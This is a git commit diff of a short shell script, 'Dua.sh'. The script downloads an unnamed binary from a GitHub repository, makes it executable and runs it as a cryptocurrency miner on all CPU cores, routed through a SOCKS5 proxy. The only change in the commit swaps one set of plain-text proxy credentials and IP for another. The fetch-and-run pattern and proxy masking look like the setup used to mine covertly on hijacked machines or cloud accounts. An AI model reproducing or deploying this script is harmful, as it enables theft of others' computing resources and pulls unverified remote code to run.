f44abbf008f3fc2f261b1d9ec20534843ea4f507
eyishxd <102873412+eyishxd@users.noreply.github.com>
2022-04-26 01:00:58 +0700

    Update Dua.sh

--- Dua.sh
+++ Dua.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget -q https://github.com/thirthada007/DevOps/raw/main/data
 chmod +x data
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://zjrpjitr:8yfoonefclaz@45.142.28.83:8094
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBbGMpNtitSpNwGMT1cXgYNTfpYdHbrGde.Test -p c=RVN -t $(nproc) -x socks5://mtyccgfz:nt7hiibuzolw@45.136.228.85:6140
